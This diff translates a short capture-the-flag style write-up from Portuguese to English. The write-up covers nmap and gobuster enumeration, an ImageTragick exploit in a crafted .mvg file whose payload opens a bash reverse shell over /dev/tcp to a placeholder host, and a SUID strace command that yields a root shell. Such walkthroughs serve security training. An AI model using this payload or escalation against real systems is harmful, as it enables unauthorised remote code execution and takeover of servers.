@@ -1,7 +1,7 @@
 # Image
 > ImageMagick RCE + strace SUID
 
-## Enumeração
+## Enumeration
 
 ```
 nmap -sC -sV -oN nmap.txt <IP>
@@ -11,11 +11,11 @@ nmap -sC -sV -oN nmap.txt <IP>
 gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
 ```
 
-Upload de imagens com processamento via ImageMagick.
+Image upload processed by ImageMagick.
 
-## Exploração
+## Exploitation
 
-ImageMagick versão vulnerável (CVE-2016-3714 / ImageTragick):
+Vulnerable ImageMagick version (CVE-2016-3714 / ImageTragick):
 
 ```
 # exploit.mvg
@@ -25,13 +25,13 @@ fill 'url(https://127.0.0.1/image.jpg"|bash -i >& /dev/tcp/<IP>/<PORTA> 0>&1")'
 pop graphic-context
 ```
 
-Upload do arquivo `.mvg` como imagem → execução de código remoto.
+Upload `.mvg` file as an image → remote code execution.
 
-Reverse shell como www-data.
+Reverse shell as www-data.
 
-## Escalada de Privilégio
+## Privilege Escalation
 
-`strace` com bit SUID identificado:
+`strace` with SUID bit identified:
 
 ```
 find / -perm -4000 2>/dev/null
@@ -42,4 +42,4 @@ find / -perm -4000 2>/dev/null
 strace -o /dev/null /bin/bash -p
 ```
 
-Root obtido.
+Root obtained.
